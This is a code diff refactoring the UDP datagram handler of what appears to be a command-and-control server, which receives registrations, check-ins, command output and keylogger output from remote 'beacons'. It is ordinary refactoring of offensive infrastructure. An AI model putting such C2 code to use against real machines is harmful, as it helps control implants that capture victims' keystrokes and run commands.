@@ -16,78 +16,25 @@ class UDPConnectionHandler:
         """Handle a UDP datagram using BaseReceiver functionality"""
         
         try:
-            # Decode the data
-            try:
-                initial_data_decoded = self.receiver_instance.encoding_strategy.decode(data)
-                initial_data = initial_data_decoded.decode('utf-8').strip()
-            except Exception as e:
-                if utils.logger:
-                    utils.logger.log_message(f"Decoding error from {client_address}: {e}")
-                return
-                
-            parts = initial_data.split('|')
-            command = parts[0] if parts else ""
+            # Use unified data processing
+            client_info = {"address": client_address, "transport": "udp"}
+            response_bytes, keep_alive = self.receiver_instance.process_received_data(data, client_info)
             
-            # Update stats using thread-safe method
-            self.receiver_instance.update_bytes_received(len(data))
-            
-            # For UDP, we only handle simple command processing (no file transfers)
-            if command in ("to_beacon", "from_beacon"):
-                # UDP doesn't support file transfers - send error response
+            # Handle file transfer rejection for UDP
+            if response_bytes == b"FILE_TRANSFER_REQUIRED":
                 error_response = self.receiver_instance.encoding_strategy.encode(
                     b"ERROR|File transfer not supported over UDP"
                 )
                 self.receiver_instance._send_udp_response(error_response, client_address)
-            else:
-                self._handle_simple_command(initial_data, client_address)
+                return
+            
+            # Send response via UDP
+            self.receiver_instance._send_udp_response(response_bytes, client_address)
+            self.receiver_instance.update_bytes_sent(len(response_bytes))
                 
         except Exception as e:
             if utils.logger:
                 utils.logger.log_message(f"UDP Error: {client_address[0]}:{client_address[1]} - {str(e)}")
-    
-    def _handle_simple_command(self, data: str, client_address: tuple):
-        """Handle simple command processing for UDP (no persistent connection)"""
-        
-        parts = data.split('|')
-        if not parts:
-            error_response = self.receiver_instance.encoding_strategy.encode(b"Invalid command format")
-            self.receiver_instance._send_udp_response(error_response, client_address)
-            return
-            
-        command = parts[0]
-        
-        try:
-            # Use existing command processor logic for stateless commands
-            if command == "command_output" and len(parts) >= 2:
-                beacon_id = parts[1]
-                output = '|'.join(parts[2:]) if len(parts) > 2 else ""
-                response = self.receiver_instance.command_processor.process_command_output(beacon_id, output)
-            elif command == "keylogger_output" and len(parts) >= 2:
-                beacon_id = parts[1]
-                output = data.split('|', 2)[2] if len(parts) > 2 else ""
-                response = self.receiver_instance.command_processor.process_keylogger_output(beacon_id, output)
-            else:
-                # Standard command dispatch
-                response = {
-                    "register": lambda: self.receiver_instance.command_processor.process_registration(
-                        parts[1], parts[2], self.receiver_instance.receiver_id, self.receiver_instance.name
-                    ) if len(parts) == 3 else "Invalid registration format",
-                    
-                    "request_action": lambda: self.receiver_instance.command_processor.process_action_request(
-                        parts[1], self.receiver_instance.receiver_id, self.receiver_instance.name
-                    ) if len(parts) == 2 else "Invalid request format",
-                    
-                    "checkin": lambda: "Check-in acknowledged"
-                        if len(parts) == 2 else "Invalid checkin format",
-                }.get(command, lambda: "Unknown command")()
-                
-            # Encode and send response
-            encoded_response = self.receiver_instance.encoding_strategy.encode(response.encode('utf-8'))
-            self.receiver_instance._send_udp_response(encoded_response, client_address)
-            
-        except Exception as e:
-            if utils.logger:
-                utils.logger.log_message(f"Error processing UDP command {command}: {e}")
 
 class UDPReceiver(BaseReceiver):
     """UDP receiver implementation with encoding support"""
